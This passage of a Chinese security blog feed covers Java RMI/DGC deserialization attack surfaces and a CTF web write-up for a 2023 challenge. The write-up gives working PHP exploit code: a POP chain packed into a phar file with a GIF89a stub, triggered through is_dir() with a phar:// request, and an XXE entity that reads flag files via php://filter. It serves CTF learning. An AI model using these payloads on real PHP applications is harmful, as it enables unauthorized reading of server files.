title="客户端请求服务端"></a>客户端请求服务端</h2><p>我们从<code>remoteObj.sayHello</code>开始调试<br>发现我们调试第一步就直接进入了invoke<br><img src="/Blogimages/RMI/45.png"><br>因为这里remoteObj是一个动态代理，所以调用方法的时候就会直接进入invoke。<br>我们从invokeRemoteMethod进入<br>然后跟进invoke：<br><img src="/Blogimages/RMI/46.png"><br>之后的走到marshaValue函数，这个函数就是判断是否是基本类型，不是的话就序列化<br><img src="/Blogimages/RMI/47.png"><br>再往下，发现执行了<code>call.executeCall()</code><br>其实不管是用户自定义的stub还是系统定义的stub都会调用这个方法，<code>executeCall()</code>是处理网络请求的东西东西，这里也有可能被攻击。因为<code>executeCall()</code>处理走的是JRMP协议，所以通过JRMP进行攻击就是通过RMI自定义的客户端协议进行攻击，攻击的是stub。可以是客户端攻击服务端，也可以是服务端攻击客户端，不过还没有研究。</p><p>再往下走，如果调用的远程函数有返回值的话会执行<code>unmarshalValue</code>，并且获取远程返回值是利用反序列化读出来的</p><h2 id="DGC的分析"><a href="#DGC的分析" class="headerlink" title="DGC的分析"></a>DGC的分析</h2><p>DGC会在创建远程服务的时候就自动创建DGC服务，我们来关注DGC服务是在何时、何处产生的。<br>我们定位到：<code>putTarget()</code>,这个函数就是在众多七七八八的都创建完之后执行的，把一些东西放在静态表里面，我们可以注意到在<code>putTarget()</code>中，有一个<code>DGCImpl.dgcLog.isLoggable</code><br><img src="/Blogimages/RMI/48.png"><br>DGC服务就是在这里创建的，这里是调用了DGCImpl类的静态函数，在类的动态加载中我们提到只要调用了类的静态函数就对这个类进行了初始化，因此会执行类的<code>static静态代码块</code><br><img src="/Blogimages/RMI/49.png"><br>在DGCImpl的静态代码块里面的try里执行了<code>new DGCImpl()</code>,再往下看一下stub是怎么创建的，其实原理和我们之前分析服务端的skel和客户端的stub一样，看一下JDK是否有<code>DGCImpl_Stub</code>这个类，有则反射创建。</p><p>在<code>DGCImpl_Stub</code>类中有两个方法，<code>clean</code>和<code>dirty</code>。这两个函数都有我们之前说过比较危险的地方：readObject和invoke<br><img src="/Blogimages/RMI/50.png"><br><img src="/Blogimages/RMI/51.png"><br>因此存在被攻击的风险。<br><code>DGCImpl_Skel</code>也是同理，也存在危险的地方<br><img src="/Blogimages/RMI/52.png"><br><img src="/Blogimages/RMI/53.png"><br>因此服务端和客户端都存在被攻击的风险。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>长城杯Web WP</title>
      <link href="/2023/03/31/2023%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%80%BB%E7%BB%93/"/>
      <url>/2023/03/31/2023%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><span id="more"></span><p>访问8000端口，题目给了源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">TheUse</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token punctuation">;</span>        <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">MyClass</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"String conversion.\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>php反序列的知识不懂可以先看：<a href="https://blog.csdn.net/qq_64201116/article/details/127234204">https://blog.csdn.net/qq_64201116&#x2F;article&#x2F;details&#x2F;127234204</a><br>看到<code>**class的魔术方法**</code>第一时间想到反序列化<br>但是没有类似于<code>unserialize()</code>的反序列化函数<br>注意到函数<code>is_dir()</code>，这个函数可以触发<code>phar</code>协议，这个phar协议可以触发反序列化<br>phar反序列化知识补充：<a href="http://home.ustc.edu.cn/~xjyuan/blog/2019/11/13/phar-unserialize/">http://home.ustc.edu.cn/~xjyuan&#x2F;blog&#x2F;2019&#x2F;11&#x2F;13&#x2F;phar-unserialize&#x2F;</a><br>但是phar需要有文件上传的点：于是找到了<code>/upload.php</code>这个功能点<br>因此思路就有了：</p><pre class=" language-info"><code class="language-info">通过链子构造phar文件，上传phar文件后用phar协议读取</code></pre><p>反序列化的链子很简单：</p><pre class=" language-xml"><code class="language-xml">TheUse$__destruct() -->MyClass$__invoke-->MyClass$getdir()  //读取文件名称TheUse$__destruct() -->MyClass$__invoke-->MyClass$load()     //读取文件内容</code></pre><p>构造反序列化链子：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">TheUse</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token punctuation">;</span>        <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">MyClass</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"String conversion.\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$xml</span><span class="token operator">=</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span><span class="token delimiter">&lt;?</span>xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token delimiter">?></span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> <span class="token constant">ANY</span><span class="token punctuation">[</span><span class="token markup">&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag.php"></span><span class="token punctuation">]</span><span class="token operator">></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span></span><span class="token operator">&amp;</span>file<span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span></span><span class="token constant">EOF</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TheUse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token variable">$xml</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="坑点1"><a href="#坑点1" class="headerlink" title="坑点1"></a>坑点1</h2><p>构造函数的时候<code>$xml</code>变量要用</p><pre class=" language-xml"><code class="language-xml">$xml=&lt;&lt;&lt;EOF<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> <span class="token doctype">&lt;!DOCTYPE ANY[&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=./flag.php"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>EOF;</code></pre><p>这种形式定义，不能直接放到构造函数里，我就是死在这</p><h2 id="坑点2"><a href="#坑点2" class="headerlink" title="坑点2"></a>坑点2</h2><p>在xml中读取文件时要用绝对路径读取协议(这里用了php伪协议读取文件:  php filter读文件知识补充<a href="https://blog.csdn.net/qq_64201116/article/details/125926612">https://blog.csdn.net/qq_64201116&#x2F;article&#x2F;details&#x2F;125926612</a>)：</p><p>不用绝对路径的报错图：</p><p><img src="/Blogimages/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/1.png"></p><p>解决方法(使用绝对路径)：</p><p><img src="/Blogimages/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/2.png"></p><h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>payload生成读取文件名的phar文件：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">TheUse</span><span class="token punctuation">{</span>     <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>     <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>     <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>     <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token punctuation">;</span>         <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">MyClass</span><span class="token punctuation">{</span>     <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>     <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"String conversion.\n"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TheUse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token string">'/var/www/html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'getdir'</span><span class="token punctuation">,</span> <span class="token string">'/var/www/html/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'GIF89a'</span><span class="token punctuation">.</span><span class="token string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// phar:[phar.phar][system_get_you_filename]/1.txt</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>运行后上传phar文件<br>然后使用phar协议读取：</p><pre class=" language-info"><code class="language-info">?f=phar:///var/www/html/phar.phar</code></pre><p><img src="/Blogimages/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/3.png"></p><p>可以看到flag的名称是<code>Maybe_flag_is_here.php</code><br>接下来读取flag：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">TheUse</span><span class="token punctuation">{</span>     <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>     <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>     <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>     <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token punctuation">;</span>         <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">MyClass</span><span class="token punctuation">{</span>     <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>     <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"String conversion.\n"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token variable">$xml</span><span class="token operator">=</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span><span class="token delimiter">&lt;?</span>xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token delimiter">?></span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> <span class="token constant">ANY</span><span class="token punctuation">[</span><span class="token markup">&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/Maybe_flag_is_here.php"></span><span class="token punctuation">]</span><span class="token operator">></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span></span><span class="token operator">&amp;</span>file<span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span></span><span class="token constant">EOF</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TheUse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token string">'/var/www/html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token variable">$xml</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'GIF89a'</span><span class="token punctuation">.</span><span class="token string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// phar:[phar.phar][system_get_you_filename]/1.txt</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>依旧是把生成的phar文件上传,使用phar协议反序列化：</p><pre class=" language-info"><code class="language-info">?f=phar:///var/www/html/phar.phar</code></pre><p><img src="/Blogimages/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/4.png"></p><p>解码得到flag:<br><img src="/Blogimages/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/5.png"></p><p>flag:<code>flag&#123;this-is-flag-for-you&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>shiro550反序列化</title>
      <link href="/2023/03/11/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/03/11/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
